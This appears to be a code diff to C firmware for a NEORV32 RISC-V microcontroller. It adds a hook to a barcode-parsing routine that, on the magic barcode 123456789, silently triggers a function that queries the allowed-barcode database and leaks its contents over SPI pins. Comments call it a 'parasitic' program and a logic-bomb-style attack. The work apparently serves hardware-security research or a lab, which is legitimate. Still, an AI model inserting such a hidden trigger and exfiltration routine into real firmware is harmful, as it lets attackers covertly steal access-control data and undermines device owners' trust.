@@ -7,86 +7,51 @@
 // #include <neorv32.h>
 
 #define BAUD_RATE_0 19200
-
 #define NEORV32_UART0_BASE 0xFFF50000U
 
-// void wait_ms(uint32_t ms) {
-//     uint64_t cycles_to_wait = ((uint64_t)100000000 / 1000) * ms;
-//     uint64_t start = neorv32_cpu_get_cycle();
-//     while ((neorv32_cpu_get_cycle() - start) < cycles_to_wait);
-// }
-
-
-// void neorv32_uart_gets(neorv32_uart_t *UARTx, char *buffer) {
-//     int idx = 0;
-//     char c;
-
-//     // print_variable_address((uint32_t)buffer, "buffer");
-//     while (1) {
-//         while (!neorv32_uart_char_received(UARTx)) {
-//             // wait for data
-//         }
-//         c = neorv32_uart_getc(UARTx);
-//         if (c == '\n' || c == '\r') {
-//             buffer[idx] = '\0';
-//             break;
-//         } else {
-//             buffer[idx++] = c;
-//         }
-//     }
-// }
-
-
 void exfiltrate_database_content();
+unsigned long long barcode_str_to_num_hooked(char *barcode_str);
+void init_spi();
 
-
-void main(void) {
-    // TODO: see objdump to make sure this variable is got 
-    // from the right place, even if it belongs to second/parasitic program
-    static bool initialized = false;
-
-    if (!initialized) {
-        initialized = true;
-        // check if SPI unit is implemented at all
-
-        neorv32_rte_setup();
-
-        neorv32_uart_setup(NEORV32_UART0_BASE, BAUD_RATE_0, 0);
-        if (neorv32_spi_available() == 0) {
-            // neorv32_uart0_printf("ERROR! No SPI unit implemented.");
-            neorv32_uart_printf(NEORV32_UART0_BASE, "ERROR! No SPI unit implemented.\n");
-            return;
-        }
-
-        // disable and reset SPI module
-        neorv32_spi_disable();
-
-        // hopefully this will set the SPI module to 5MHz (100MHz / prescaler )
-        // (according to the formula in the "spi_setup" from the "demo_spi" example)
-        //   uint32_t clock = neorv32_sysinfo_get_clk() / (2 * PRSC_LUT[spi_prsc] * (1 + clk_div));
-        //   clk = 100MHz / (2 * 2 * (1 + 4)) = 100MHz / 20 = 5MHz
-        int prescaler = 2;
-        int clk_div = 4;
-        // uint32_t spi_hz = neorv32_sysinfo_get_clk() / (prescaler * clk_div);
-        int clk_polarity = 1; // high when idle
-        int clk_phase = 0; // sample on rising edge
-        neorv32_spi_setup(prescaler, clk_div, clk_phase, clk_polarity);                                                   
-        // enable chip select (first channel)
-        neorv32_spi_cs_en(0); // hardware design assumes there's only one SPI device anyway, this is not really needed
+unsigned long long barcode_str_to_num_hooked(char *barcode_str) {
+    // call original function
+    unsigned long long barcode = barcode_str_to_num(barcode_str);
+    if (barcode == 123456789) {
+        exfiltrate_database_content();
     }
-    // check if it's possible to use the exfil function once
-    // (will have to observe SPI pins in System ILA to check if it works,
-    // or go to the lab with Esp/Arduino)
+    return barcode;
+}
 
-    // TODO: add debug probes, and resynthesise the design
-    //       then check
-    // // qrcode 123456 activates the attack (exfiltration of database content via SPI)
-    // // equivalent of time-dependent logic-bomb
-    // if (qrcode != 123456)
-    //     return;
-    exfiltrate_database_content();
-    
-    return 0;
+void init_spi() {
+
+    // 2 lines below would only be needed if running this program as 
+    // standalone, but this is not needed because the forensic program
+    // already initialises UART
+
+    // neorv32_rte_setup();
+    // neorv32_uart_setup(NEORV32_UART0_BASE, BAUD_RATE_0, 0);
+
+    if (neorv32_spi_available() == 0) {
+        // neorv32_uart0_printf("ERROR! No SPI unit implemented.");
+        neorv32_uart_printf(NEORV32_UART0_BASE, "ERROR! No SPI unit implemented.\n");
+        return;
+    }
+
+    // disable and reset SPI module
+    neorv32_spi_disable();
+
+    // hopefully this will set the SPI module to 5MHz (100MHz / prescaler )
+    // (according to the formula in the "spi_setup" from the "demo_spi" example)
+    //   uint32_t clock = neorv32_sysinfo_get_clk() / (2 * PRSC_LUT[spi_prsc] * (1 + clk_div));
+    //   clk = 100MHz / (2 * 2 * (1 + 4)) = 100MHz / 20 = 5MHz
+    int prescaler = 2;
+    int clk_div = 4;
+    // uint32_t spi_hz = neorv32_sysinfo_get_clk() / (prescaler * clk_div);
+    int clk_polarity = 1; // high when idle
+    int clk_phase = 0; // sample on rising edge
+    neorv32_spi_setup(prescaler, clk_div, clk_phase, clk_polarity);                                                   
+    // enable chip select (first channel)
+    neorv32_spi_cs_en(0); // hardware design assumes there's only one SPI device anyway, this is not really needed
 }
 
 //  void hooked_qrcode_check(uint32_t qrcode) {
@@ -94,6 +59,12 @@ void main(void) {
 //  }
 
 void exfiltrate_database_content() {
+    static bool spi_initialized = false;
+    if (!spi_initialized) {
+        init_spi();
+        spi_initialized = true;
+    }
+
     // neorv32_uart0_printf("SELECT * FROM allowed_barcode_IDs\n");
     neorv32_uart_printf(NEORV32_UART0_BASE, "SELECT * FROM allowed_barcode_IDs\n");
     wait_ms(500);
